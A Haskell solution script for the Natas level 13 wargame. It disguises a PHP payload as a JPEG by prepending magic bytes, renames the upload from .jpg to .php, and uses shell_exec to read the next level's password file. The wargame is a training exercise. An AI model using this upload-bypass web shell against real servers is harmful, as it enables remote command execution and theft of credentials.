{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas13 where

import           Data.ByteString       (ByteString)
import qualified Data.ByteString       as B
import qualified Data.ByteString.Lazy  as LB
import           Data.Text             (Text)
import qualified Data.Text             as T
import           Safe                  (headMay)

import           Data.HexString        (hexString, toBytes)
import           Network.Wreq          (Part, partFile, partText, responseBody)
import           System.FilePath.Posix ((</>))
import           Text.HTML.TagSoup     (Tag, fromAttrib, isTagOpenName,
                                        parseTags)

import           Control.Lens

import           Natas.Natas

solution :: Solution
solution = do
  payload <- getPayload
  uri <- getUploadUri payload
  traverse getPassword uri

getPayload :: IO [Part]
getPayload = do
  writePayload
  req <- getLevel 13
  let body = reqBody req
      parsedForm = (fmap tagToPartPhp . parseInputForm) body
      phpPart = partFile "uploadedfile" (phpFileDir </> phpFilePath)
      payload = phpPart : parsedForm
  return payload

getUploadUri :: [Part] -> IO (Maybe Text)
getUploadUri payload = do
  req <- postLevel 13 payload
  let body = reqBody req
  pure $ headMay (parseUriHrefs body)

getPassword :: Text -> IO Text
getPassword uri = do
  req <- getLevel' 13 (concat [parentUri 13, "/", T.unpack uri]) id
  let skipBytes = responseBody %~ LB.drop (fromIntegral (B.length jpegMagic))
      body = reqBody (skipBytes req)
      match = T.strip body
  pure match

parseUriHrefs :: Text -> [Text]
parseUriHrefs = fmap (fromAttrib "href") . filter (and . formables) . parseTags
  where
    formables = sequenceA [isTagOpenName "a", (/= "") . fromAttrib "href"]

parseInputForm :: Text -> [Tag Text]
parseInputForm = filter (and . formables) . parseTags
  where
    formables =
      sequenceA
        [ isTagOpenName "input"
        , (/= "") . fromAttrib "value"
        , (/= "") . fromAttrib "name"
        ]

tagToPart :: Tag Text -> Part
tagToPart = tagToPart' partText

tagToPart' :: (Text -> Text -> Part) -> Tag Text -> Part
tagToPart' converter = converter <$> fromAttrib "name" <*> fromAttrib "value"

tagToPartPhp :: Tag Text -> Part
tagToPartPhp = tagToPart' converter
  where
    converter name value
      | name == "filename" = partText name (T.replace ".jpg" ".php" value)
      | otherwise = partText name value

phpFileDir :: FilePath
phpFileDir = "php"

phpFilePath :: FilePath
phpFilePath = "natas13.php"

phpContents :: ByteString
phpContents =
  B.append
    jpegMagic
    "<?php echo shell_exec('cat /etc/natas_webpass/natas14'); ?>"

jpegMagic :: ByteString
jpegMagic = toBytes (hexString "ffd8ffd8")

writePayload :: IO ()
writePayload = B.writeFile (phpFileDir </> phpFilePath) phpContents
